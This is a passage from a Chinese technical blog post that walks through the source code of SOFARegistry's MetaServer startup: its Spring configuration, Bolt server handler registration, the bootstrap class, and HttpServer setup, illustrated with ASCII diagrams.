    public static class MetaServerRemotingConfiguration {
    }

    @Configuration
    public static class ResourceConfiguration {
    }

    @Configuration
    public static class MetaServerTaskConfiguration {
    }

    @Configuration
    public static class ExecutorConfiguation {
    }

    @Configuration
    public static class MetaDBConfiguration {
    }  
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们的图进化如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;                                   (Init)
                            +------------------------------------+
                            | MetaServerInitializerConfiguration |
                            +-------------+----------------------+      +---------------------+
                                          ^                       +--&amp;gt;  | MetaServerBootstrap |
+-------------------+                     |                       |     +---------------------+
| @EnableMetaServer |                     |                       |     +---------------------------------+
|                   |                     |                       +--&amp;gt;  |MetaServerConfigBeanConfiguration|
|  MetaApplication  |                     |                       |     +---------------------------------+
+--------------+----+                     |                       |     +------------------------------+
               |                          |                       +--&amp;gt;  |MetaServerServiceConfiguration|
               |                          |                       |     +------------------------------+
               |                          |                       |     +---------------------------------+
               |                          |                       +--&amp;gt;  |MetaServerRepositoryConfiguration|
               |                          |                       |     +---------------------------------+
               |                          | (Configuration)       |     +-------------------------------+
               |                +---------+---------------+       +--&amp;gt;  |MetaServerRemotingConfiguration|
               +--------------&amp;gt; | MetaServerConfiguration | +-----+     +-------------------------------+
                                +-------------------------+       |     +----------------------+
                                                                  +--&amp;gt;  |ResourceConfiguration |
                                                                  |     +----------------------+
                                                                  |     +---------------------------+
                                                                  +--&amp;gt;  |MetaServerTaskConfiguration|
                                                                  |     +---------------------------+
                                                                  |     +---------------------+
                                                                  +--&amp;gt;  |ExecutorConfiguation |
                                                                  |     +---------------------+
                                                                  |     +--------------------+
                                                                  +--&amp;gt;  |MetaDBConfiguration |
                                                                        +--------------------+

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;下图为了手机阅读&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1850883/202010/1850883-20201008211556469-1233510482.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;522-handler的配置&quot;&gt;5.2.2 handler的配置&lt;/h4&gt;
&lt;p&gt;这里要特殊提一下handler的配置，因为这是后续分析的主体之一，是&lt;u&gt;三个 &lt;strong&gt;Bolt Server&lt;/strong&gt;的handler&lt;/u&gt;。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Configuration
public static class MetaServerRemotingConfiguration {

    @Bean
    public Exchange boltExchange() {
        return new BoltExchange();
    }

    @Bean
    public Exchange jerseyExchange() {
        return new JerseyExchange();
    }

    @Bean(name = &quot;sessionServerHandlers&quot;)
    public Collection&amp;lt;AbstractServerHandler&amp;gt; sessionServerHandlers() {
        Collection&amp;lt;AbstractServerHandler&amp;gt; list = new ArrayList&amp;lt;&amp;gt;();
        list.add(sessionConnectionHandler());
        list.add(sessionNodeHandler());
        list.add(renewNodesRequestHandler());
        list.add(getNodesRequestHandler());
        list.add(fetchProvideDataRequestHandler());
        return list;
    }

    @Bean(name = &quot;dataServerHandlers&quot;)
    public Collection&amp;lt;AbstractServerHandler&amp;gt; dataServerHandlers() {
        Collection&amp;lt;AbstractServerHandler&amp;gt; list = new ArrayList&amp;lt;&amp;gt;();
        list.add(dataConnectionHandler());
        list.add(getNodesRequestHandler());
        list.add(dataNodeHandler());
        list.add(renewNodesRequestHandler());
        list.add(fetchProvideDataRequestHandler());
        return list;
    }

    @Bean(name = &quot;metaServerHandlers&quot;)
    public Collection&amp;lt;AbstractServerHandler&amp;gt; metaServerHandlers() {
        Collection&amp;lt;AbstractServerHandler&amp;gt; list = new ArrayList&amp;lt;&amp;gt;();
        list.add(metaConnectionHandler());
        list.add(getNodesRequestHandler());
        return list;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;于是我们的总体架构进化具体见下图&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;                               (Init)
                        +------------------------------------+
                        | MetaServerInitializerConfiguration |
                        +--------------+---------------------+
                                       ^
                                       |
                                       |
                                       |
                                       |
                                       |                             +---------------------+
                                       |                       +--&amp;gt;  | MetaServerBootstrap |
+-------------------+                  |                       |     +---------------------+
| @EnableMetaServer |                  |                       |     +---------------------------------+
|                   |                  |                       +--&amp;gt;  |MetaServerConfigBeanConfiguration|
|  MetaApplication  |                  |                       |     +---------------------------------+
+--------------+----+                  |                       |     +------------------------------+             +-----------------------+
               |                       |                       +--&amp;gt;  |MetaServerServiceConfiguration|      +---&amp;gt;  | sessionServerHandlers |
               |                       |                       |     +------------------------------+      |      +-----------------------+
               |                       |                       |     +---------------------------------+   |      +--------------------+
               |                       |                       +--&amp;gt;  |MetaServerRepositoryConfiguration+-------&amp;gt;  | dataServerHandlers |
               |                       |                       |     +---------------------------------+   |      +--------------------+
               |                       | (Configuration)       |     +-------------------------------+     |      +--------------------+
               |             +---------+---------------+       +--&amp;gt;  |MetaServerRemotingConfiguration|     +---&amp;gt;  | metaServerHandlers |
               +-----------&amp;gt; | MetaServerConfiguration | +-----+     +-------------------------------+            +--------------------+
                             +-------------------------+       |     +----------------------+
                                                               +--&amp;gt;  |ResourceConfiguration |
                                                               |     +----------------------+
                                                               |     +---------------------------+
                                                               +--&amp;gt;  |MetaServerTaskConfiguration|
                                                               |     +---------------------------+
                                                               |     +---------------------+
                                                               +--&amp;gt;  |ExecutorConfiguation |
                                                               |     +---------------------+
                                                               |     +--------------------+
                                                               +--&amp;gt;  |MetaDBConfiguration |
                                                                     +--------------------+

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;手机上阅读如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1850883/202010/1850883-20201008211622858-681328880.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;关于handler配置，进一步细化如下图&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;                               (Init)

                                                                                                                +--&amp;gt;  sessionConnectionHandler
                                                                                                                |
                                                                                                                |
                                                                                                                +--&amp;gt;  sessionNodeHandler
                                                                                     +-----------------------+  |
                                                                              +---&amp;gt;  | sessionServerHandlers +--+
                                        +---------------------+               |      +-----------------------+  +--&amp;gt;  renewNodesRequestHandler
                                  +--&amp;gt;  | MetaServerBootstrap |               |                                 |
                                  |     +---------------------+               |                                 |
                                  |     +---------------------------------+   |                                 +--&amp;gt;  getNodesRequestHandler
                                  +--&amp;gt;  |MetaServerConfigBeanConfiguration|   |                                 |
                                  |     +---------------------------------+   |                                 |
                                  |     +------------------------------+      |                                 +--&amp;gt;  fetchProvideDataRequestHandler
                                  +--&amp;gt;  |MetaServerServiceConfiguration|      |
                                  |     +------------------------------+      |
                                  |     +---------------------------------+   |                                 +--&amp;gt;  dataConnectionHandler
                                  +--&amp;gt;  |MetaServerRepositoryConfiguration+---+                                 |
                                  |     +---------------------------------+   |                                 |
                                  |     +-------------------------------+     |      +--------------------+     +--&amp;gt;  getNodesRequestHandler
+-------------------------+       +--&amp;gt;  |MetaServerRemotingConfiguration|     +---&amp;gt;  | dataServerHandlers +-----+
| MetaServerConfiguration | +-----+     +-------------------------------+     |      +--------------------+     |
+-------------------------+       |     +----------------------+              |                                 +--&amp;gt;  dataNodeHandler
                                  +--&amp;gt;  |ResourceConfiguration |              |                                 |
                                  |     +----------------------+              |                                 |
                                  |     +---------------------------+         |                                 +--&amp;gt;  renewNodesRequestHandler
                                  +--&amp;gt;  |MetaServerTaskConfiguration|         |                                 |
                                  |     +---------------------------+         |                                 |
                                  |     +---------------------+               |                                 +--&amp;gt;  fetchProvideDataRequestHandler
                                  +--&amp;gt;  |ExecutorConfiguation |               |
                                  |     +---------------------+               |
                                  |     +--------------------+                |
                                  +--&amp;gt;  |MetaDBConfiguration |                |                                 +---&amp;gt; metaConnectionHandler
                                        +--------------------+                |      +--------------------+     |
                                                                              +----&amp;gt; | metaServerHandlers +-----+
                                                                                     +--------------------+     +---&amp;gt; getNodesRequestHandler

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;手机上如图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1850883/202010/1850883-20201008211646514-1522015430.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这个就对应了参考中的图例：&lt;/p&gt;
&lt;p&gt;MetaServer 在启动时，会启动三个 &lt;strong&gt;Bolt Server&lt;/strong&gt;，并且注册 Processor Handler，处理对应的请求：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2019/png/338467/1568253181089-b7fa6993-af59-41c8-b0a7-fad01f5dc9d0.png&quot; alt=&quot;meta-server&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;DataServer：处理 DataNode 相关的请求；&lt;/li&gt;
&lt;li&gt;SessionServer：处理 SessionNode 相关的请求；&lt;/li&gt;
&lt;li&gt;MetaServer：处理MetaNode相关的请求；&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;0x06-启动&quot;&gt;0x06 启动&lt;/h2&gt;
&lt;p&gt;系统是通过对MetaServerBootstrap的控制来完成了启动。&lt;/p&gt;
&lt;p&gt;MetaServer 模块的各个 bean 在 JavaConfig 中统一配置，JavaConfig 类为 MetaServerConfiguration。&lt;/p&gt;
&lt;p&gt;启动入口类为 MetaServerInitializerConfiguration，该类不由 JavaConfig 管理配置，而是继承了 SmartLifecycle 接口，在启动时由 Spring 框架调用其 start 方法。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class MetaServerInitializerConfiguration implements SmartLifecycle {
    @Autowired
    private MetaServerBootstrap metaServerBootstrap;

    @Override
    public void start() {
        metaServerBootstrap.start();
                        MetaServerInitializerConfiguration.this.running.set(true);
    }

    @Override
    public void stop() {
        this.running.set(false);
        metaServerBootstrap.destroy();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;具体见下图，因为 metaServerBootstrap 是通过配置生成，所以init过程指向配置部分。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;                               (Init)
                        +------------------------------------+  start,stop
                        | MetaServerInitializerConfiguration +----------------+
                        +--------------+---------------------+                |
                                       ^                                      |
                                       |                                      |
                                       |                                      |
                                       |                                      |
                                       |                                      v
                                       |                             +---------------------+
                                       |                       +--&amp;gt;  | MetaServerBootstrap |
+-------------------+                  |                       |     +---------------------+
| @EnableMetaServer |                  |                       |     +---------------------------------+
|                   |                  |                       +--&amp;gt;  |MetaServerConfigBeanConfiguration|
|  MetaApplication  |                  |                       |     +---------------------------------+
+--------------+----+                  |                       |     +------------------------------+             +-----------------------+
               |                       |                       +--&amp;gt;  |MetaServerServiceConfiguration|      +---&amp;gt;  | sessionServerHandlers |
               |                       |                       |     +------------------------------+      |      +-----------------------+
               |                       |                       |     +---------------------------------+   |      +--------------------+
               |                       |                       +--&amp;gt;  |MetaServerRepositoryConfiguration+-------&amp;gt;  | dataServerHandlers |
               |                       |                       |     +---------------------------------+   |      +--------------------+
               |                       | (Configuration)       |     +-------------------------------+     |      +--------------------+
               |             +---------+---------------+       +--&amp;gt;  |MetaServerRemotingConfiguration|     +---&amp;gt;  | metaServerHandlers |
               +-----------&amp;gt; | MetaServerConfiguration | +-----+     +-------------------------------+            +--------------------+
                             +-------------------------+       |     +----------------------+
                                                               +--&amp;gt;  |ResourceConfiguration |
                                                               |     +----------------------+
                                                               |     +---------------------------+
                                                               +--&amp;gt;  |MetaServerTaskConfiguration|
                                                               |     +---------------------------+
                                                               |     +---------------------+
                                                               +--&amp;gt;  |ExecutorConfiguation |
                                                               |     +---------------------+
                                                               |     +--------------------+
                                                               +--&amp;gt;  |MetaDBConfiguration |
                                                                     +--------------------+

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;手机上如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1850883/202010/1850883-20201008211716765-768680168.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;61-架构&quot;&gt;6.1 架构&lt;/h3&gt;
&lt;p&gt;MetaServerBootstrap是核心启动类，该类主要包含了三类组件：外部节点通信组件、Raft 服务通信组件、定时器组件。&lt;/p&gt;
&lt;ul readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;&lt;strong&gt;外部节点通信组件&lt;/strong&gt;：在该类中有几个 Server 通信对象，用于和其它外部节点进行通信。其中 httpServer 主要提供一系列 http 接口，用于 dashboard 管理、数据查询等；sessionServer 主要是处理一些session相关的服务；dataServer 则负责数据相关服务；metaServer 负责meta server的注册；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;strong&gt;Raft 服务&lt;/strong&gt; ：用于集群间的变更和数据同步，raftExchanger 就起到这个作用；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;&lt;strong&gt;定时器组件&lt;/strong&gt;：例如定时检测节点信息、定时检测数据版本信息；具体可见 ExecutorManager，这是一个启动各种管理线程的地方。他的启动设置是在 MetaServerBootstrap.initRaft 之中 。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;62-类定义&quot;&gt;6.2 类定义&lt;/h3&gt;
&lt;p&gt;MetaServerBootstrap的定义如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class MetaServerBootstrap {
    @Autowired
    private MetaServerConfig                  metaServerConfig;

    @Autowired
    private Exchange                          boltExchange;

    @Autowired
    private Exchange                          jerseyExchange;

    @Autowired
    private ExecutorManager                   executorManager;

    @Resource(name = &quot;sessionServerHandlers&quot;)
    private Collection&amp;lt;AbstractServerHandler&amp;gt; sessionServerHandlers;

    @Resource(name = &quot;dataServerHandlers&quot;)
    private Collection&amp;lt;AbstractServerHandler&amp;gt; dataServerHandlers;

    @Resource(name = &quot;metaServerHandlers&quot;)
    private Collection&amp;lt;AbstractServerHandler&amp;gt; metaServerHandlers;

    @Autowired
    private ResourceConfig                    jerseyResourceConfig;

    @Autowired
    private ApplicationContext                applicationContext;

    @Autowired
    private RaftExchanger                     raftExchanger;

    private Server                            sessionServer;

    private Server                            dataServer;

    private Server                            metaServer;

    private Server                            httpServer;

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以参见下图&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;                                                                                         +-----------------+
                                                                                 +----&amp;gt;  | metaServerConfig|
                                                                                 |       +-----------------+
                                                                                 |       +--------------+
                                                                                 +----&amp;gt;  | boltExchange |
                                                                                 |       +--------------+
                                                                                 |       +--------------+
                                                                                 +----&amp;gt;  |jerseyExchange|
                                                                                 |       +--------------+
                                                                                 |       +---------------+
                                                                                 +----&amp;gt;  |executorManager|
                                                                                 |       +---------------+
                                                                                 |       +---------------------+
                                                                                 +----&amp;gt;  |sessionServerHandlers|
                                                                                 |       +---------------------+
                                                                                 |       +-----------------+
                                                                                 +----&amp;gt;  |dataServerHandler|
       (Init)                                                                    |       +-----------------+
+------------------------------------+  start,stop   +---------------------+     |       +------------------+
| MetaServerInitializerConfiguration +-------------&amp;gt; | MetaServerBootstrap | +--------&amp;gt;  |metaServerHandlers|
+------------------------------------+               +---------------------+     |       +------------------+
                                                                                 |       +-------------+
                                                                                 +----&amp;gt;  |raftExchanger|
                                                                                 |       +-------------+
                                                                                 |       +-------------+
                                                                                 +----&amp;gt;  |sessionServer|
                                                                                 |       +-------------+
                                                                                 |       +-----------+
                                                                                 +----&amp;gt;  |dataServer |
                                                                                 |       +-----------+
                                                                                 |       +-----------+
                                                                                 +----&amp;gt;  |metaServer |
                                                                                 |       +-----------+
                                                                                 |       +----------+
                                                                                 +----&amp;gt;  |httpServer|
                                                                                 |       +----------+
                                                                                 |       +---------------------+
                                                                                 +----&amp;gt;  |jerseyResourceConfig |
                                                                                 |       +---------------------+
                                                                                 |       +-------------------+
                                                                                 +----&amp;gt;  |applicationContext |
                                                                                         +-------------------+

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;手机参见下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1850883/202010/1850883-20201008211740270-396181636.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;63-通信-exchange&quot;&gt;6.3 通信 Exchange&lt;/h3&gt;
&lt;p&gt;因为前面代码中有&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Autowired
private Exchange                          boltExchange;

@Autowired
private Exchange                          jerseyExchange;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里要特殊说明下Exchange。&lt;/p&gt;
&lt;p&gt;&lt;u&gt;Exchange 作为 Client / Server 连接的抽象，负责节点之间的连接&lt;/u&gt;。在建立连接中，可以设置一系列应对不同任务的 handler (称之为 ChannelHandler)，这些 ChannelHandler 有的作为 Listener 用来处理连接事件，有的作为 Processor 用来处理各种指定的事件，比如服务信息数据变化、Subscriber 注册等事件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2019/png/307286/1571043263465-aee1b311-17ca-4e22-85df-9dadb908c46e.png&quot; alt=&quot;图4 - 每一层各司其职，协同实现节点通信&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图 - 每一层各司其职，协同实现节点通信&lt;/p&gt;
&lt;p&gt;各种节点在启动的时候，利用 Exchange 设置了一系列 ChannelHandler，比如：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void openDataRegisterServer() {
    try {
        if (dataStart.compareAndSet(false, true)) {
            dataServer = boltExchange.open(new URL(NetUtil.getLocalAddress().getHostAddress(),
                metaServerConfig.getDataServerPort()), dataServerHandlers
                .toArray(new ChannelHandler[dataServerHandlers.size()]));
        }
    } 
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;64-启动入口&quot;&gt;6.4 启动入口&lt;/h3&gt;
&lt;p&gt;前面已经提到，启动入口类为 MetaServerInitializerConfiguration，该类不由 JavaConfig 管理配置，而是继承了 SmartLifecycle 接口，在启动时由 Spring 框架调用其 start 方法。&lt;/p&gt;
&lt;p&gt;该方法中调用了 MetaServerBootstrap # start 方法，用于启动一系列的初始化服务。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.SmartLifecycle;

public class MetaServerInitializerConfiguration implements SmartLifecycle {
    @Autowired
    private MetaServerBootstrap metaServerBootstrap;‘
      
    @Override
    public void start() {
            metaServerBootstrap.start();
            MetaServerInitializerConfiguration.this.running.set(true);
    }
}               
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;641-启动服务server&quot;&gt;6.4.1 启动服务Server&lt;/h3&gt;
&lt;p&gt;前面提到，MetaServerBootstrap 在启动时，会启动三个 &lt;strong&gt;Bolt Server&lt;/strong&gt;，并且注册 Processor Handler，处理对应的请求：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;DataServer：处理 DataNode 相关的请求；&lt;/li&gt;
&lt;li&gt;SessionServer：处理 SessionNode 相关的请求；&lt;/li&gt;
&lt;li&gt;MetaServer：处理MetaNode相关的请求；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;然后启动 &lt;strong&gt;HttpServer&lt;/strong&gt;, 用于处理 Admin 请求，提供推送开关，集群数据查询等 Http 接口。&lt;/p&gt;
&lt;p&gt;最后启动 &lt;strong&gt;Raft 服务&lt;/strong&gt;， 每个节点同时作为 RaftClient 和 RaftServer, 用于集群间的变更和数据同步。为支持高可用特性，对于 MetaServer 来说，存储了 SOFARegistry 的元数据，为了保障 MetaServer 集群的一致性，其采用了 Raft 协议来进行选举和复制。&lt;/p&gt;
&lt;p&gt;具体代码参见：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void start() {
        openSessionRegisterServer();
        openDataRegisterServer();
        openMetaRegisterServer();
        openHttpServer();
        initRaft();
}

private void openHttpServer() {
        if (httpStart.compareAndSet(false, true)) {
            bindResourceConfig();
            httpServer = jerseyExchange.open(
                new URL(NetUtil.getLocalAddress().getHostAddress(), metaServerConfig
                    .getHttpServerPort()), new ResourceConfig[] { jerseyResourceConfig });
        }
}

private void initRaft() {
    raftExchanger.startRaftServer(executorManager);
    raftExchanger.startRaftClient();
    raftExchanger.startCliService();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;6411-boltserver&quot;&gt;6.4.1.1 BoltServer&lt;/h4&gt;
&lt;p&gt;Raft 和 Bolt 是SOFA所特殊实现，所以我们暂不介绍其底层机制，以后有机会单独开篇，下面提一下三个BoltServer。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void openSessionRegisterServer() {
        if (sessionStart.compareAndSet(false, true)) {
            sessionServer = boltExchange
                .open(
                    new URL(NetUtil.getLocalAddress().getHostAddress(), metaServerConfig
                        .getSessionServerPort()), sessionServerHandlers
                        .toArray(new ChannelHandler[sessionServerHandlers.size()]));

        }
}

private void openDataRegisterServer() {
        if (dataStart.compareAndSet(false, true)) {
            dataServer = boltExchange.open(new URL(NetUtil.getLocalAddress().getHostAddress(),
                metaServerConfig.getDataServerPort()), dataServerHandlers
                .toArray(new ChannelHandler[dataServerHandlers.size()]));
        }
}

private void openMetaRegisterServer() {
        if (metaStart.compareAndSet(false, true)) {
            metaServer = boltExchange.open(new URL(NetUtil.getLocalAddress().getHostAddress(),
                metaServerConfig.getMetaServerPort()), metaServerHandlers
                .toArray(new ChannelHandler[metaServerHandlers.size()]));
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这几个Server的handler就是我们前面配置的&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Resource(name = &quot;sessionServerHandlers&quot;)
private Collection&amp;lt;AbstractServerHandler&amp;gt; sessionServerHandlers;

@Resource(name = &quot;dataServerHandlers&quot;)
private Collection&amp;lt;AbstractServerHandler&amp;gt; dataServerHandlers;

@Resource(name = &quot;metaServerHandlers&quot;)
private Collection&amp;lt;AbstractServerHandler&amp;gt; metaServerHandlers;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;具体参见下图：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;                                                                                                        +------------------------+
                                    +-----------------+                                           +---&amp;gt; |sessionConnectionHandler|
                            +----&amp;gt;  | metaServerConfig|                                           |     +------------------------+
                            |       +-----------------+                                           |     +-------------------+
                            |       +--------------+                                              +---&amp;gt; |sessionNodeHandler |
                            +----&amp;gt;  | boltExchange |                                          +--&amp;gt;+     +-------------------+
                            |       +--------------+                                          |   |     +------------------------+
                            |       +--------------+                                          |   +---&amp;gt; |renewNodesRequestHandler|
                            +----&amp;gt;  |jerseyExchange|                                          |   |     +------------------------+
                            |       +--------------+                                          |   |     +----------------------+
                            |       +---------------+                                         |   +---&amp;gt; |getNodesRequestHandler|
                            +----&amp;gt;  |executorManager|                                         |   |     +----------------------+
                            |       +---------------+               +---------------------+   |   |     +------------------------------+
                            +-------------------------------------&amp;gt; |sessionServerHandlers+---+   +---&amp;gt; |fetchProvideDataRequestHandler|
                            |       +-------------+                 +---------------------+             +------------------------------+
                            +----&amp;gt;  |sessionServer| +------------------^
                            |       +-------------+                                                     +---------------------+
                            |                                                                     ----&amp;gt; |dataConnectionHandler|
                            |                                       +------------------+          |     +---------------------+
+---------------------+     +-------------------------------------&amp;gt; |dataServerHandlers+----------+     +----------------------+
| MetaServerBootstrap | +---+       +-----------+                   +------------------+          +---&amp;gt; |getNodesRequestHandler|
+---------------------+     +----&amp;gt;  |dataServer +----------------------^                          |     +----------------------+
                            |       +-----------+                                                 |     +---------------+
                            |                                                                     +---&amp;gt; |dataNodeHandler|
                            |                                       +------------------+          |     +---------------+
                            +------------------------------------&amp;gt;  |metaServerHandlers+------+   |     +------------------------+
                            |       +-----------+                   +------------------+      |   +---&amp;gt; |renewNodesRequestHandler|
                            +----&amp;gt;  |metaServer +----------------------^                      |   |     +------------------------+
                            |       +-----------+                                             |   |     +------------------------------+
                            |                                                                 |   +---&amp;gt; |fetchProvideDataRequestHandler|
                            |       +-------------+                                           |         +------------------------------+
                            +----&amp;gt;  |raftExchanger|                                           |
                            |       +-------------+                                           |
                            |                                                                 |
                            |       +----------+                                              |
                            +----&amp;gt;  |httpServer|                                              |          +---------------------+
                            |       +----------+                                              |    +--&amp;gt;  |metaConnectionHandler|
                            |       +---------------------+                                   +----&amp;gt;     +---------------------+
                            +----&amp;gt;  |jerseyResourceConfig |                                        |     +---------------------+
                            |       +---------------------+                                        +--&amp;gt;  |getNodesRequestHandle|
                            |       +-------------------+                                                +---------------------+
                            +----&amp;gt;  |applicationContext |
                                    +-------------------+

&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;手机上&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1850883/202010/1850883-20201008211807513-162939095.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在初始化时候，大致堆栈如下 ：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;interest:55, RenewNodesRequestHandler (com.alipay.sofa.registry.server.meta.remoting.handler)
interest:61, SyncUserProcessorAdapter (com.alipay.sofa.registry.remoting.bolt)
registerUserProcessor:42, UserProcessorRegisterHelper (com.alipay.remoting.rpc.protocol)
registerUserProcessor:376, RpcServer (com.alipay.remoting.rpc)
registerUserProcessorHandler:159, BoltServer (com.alipay.sofa.registry.remoting.bolt)
initHandler:139, BoltServer (com.alipay.sofa.registry.remoting.bolt)
startServer:92, BoltServer (com.alipay.sofa.registry.remoting.bolt)
open:65, BoltExchange (com.alipay.sofa.registry.remoting.bolt.exchange)
open:36, BoltExchange (com.alipay.sofa.registry.remoting.bolt.exchange)
openSessionRegisterServer:149, MetaServerBootstrap (com.alipay.sofa.registry.server.meta.bootstrap)
start:108, MetaServerBootstrap (com.alipay.sofa.registry.server.meta.bootstrap)
start:51, MetaServerInitializerConfiguration (com.alipay.sofa.registry.server.meta.bootstrap)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;以SessionServer为例，在构建过程中，调用到 BoltExchange . open。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void openSessionRegisterServer() {
        if (sessionStart.compareAndSet(false, true)) {
            sessionServer = boltExchange
                .open(
                    new URL(NetUtil.getLocalAddress().getHostAddress(), metaServerConfig
                        .getSessionServerPort()), sessionServerHandlers
                        .toArray(new ChannelHandler[sessionServerHandlers.size()]));
        }   
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;BoltExchange中有&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Override
public Server open(URL url, ChannelHandler... channelHandlers) {
    BoltServer server = createBoltServer(url, channelHandlers);
    setServer(server, url);
    server.startServer();
    return server;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;BoltServer中有&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void startServer() {
    if (isStarted.compareAndSet(false, true)) {
            boltServer = new RpcServer(url.getPort(), true);
            initHandler();
            boltServer.start();
    } 
}

private void initHandler() {
        if (initHandler.compareAndSet(false, true)) {
            boltServer.addConnectionEventProcessor(ConnectionEventType.CONNECT,
                new ConnectionEventAdapter(ConnectionEventType.CONNECT,
                    getConnectionEventHandler(), this));
            boltServer.addConnectionEventProcessor(ConnectionEventType.CLOSE,
                new ConnectionEventAdapter(ConnectionEventType.CLOSE, getConnectionEventHandler(),
                    this));
            boltServer.addConnectionEventProcessor(ConnectionEventType.EXCEPTION,
                new ConnectionEventAdapter(ConnectionEventType.EXCEPTION,
                    getConnectionEventHandler(), this));

            registerUserProcessorHandler();
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;最后调用，会设定同步和异步的handler。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void registerUserProcessorHandler() {
    if (channelHandlers != null) {
        for (ChannelHandler channelHandler : channelHandlers) {
            if (HandlerType.PROCESSER.equals(channelHandler.getType())) {
                if (InvokeType.SYNC.equals(channelHandler.getInvokeType())) {
                    boltServer.registerUserProcessor(new SyncUserProcessorAdapter(
                        channelHandler));
                } else {
                    boltServer.registerUserProcessor(new AsyncUserProcessorAdapter(
                        channelHandler));
                }
            }
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;6412-httpserver&quot;&gt;6.4.1.2 HttpServer&lt;/h4&gt;
&lt;p&gt;以使用 Jetty 的 openHttpServer 为例&lt;/p&gt;
&lt;p&gt;启动 HttpServer, 用于处理 Admin 请求，提供推送开关，集群数据查询等 Http 接口。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class JerseyJettyServer implements Server {
    public static org.eclipse.jetty.server.Server createServer(final URI uri,
                                                               final ResourceConfig resourceConfig,
                                                               final boolean start) {

        JettyHttpContainer handler = ContainerFactory.createContainer(JettyHttpContainer.class,
            resourceConfig);

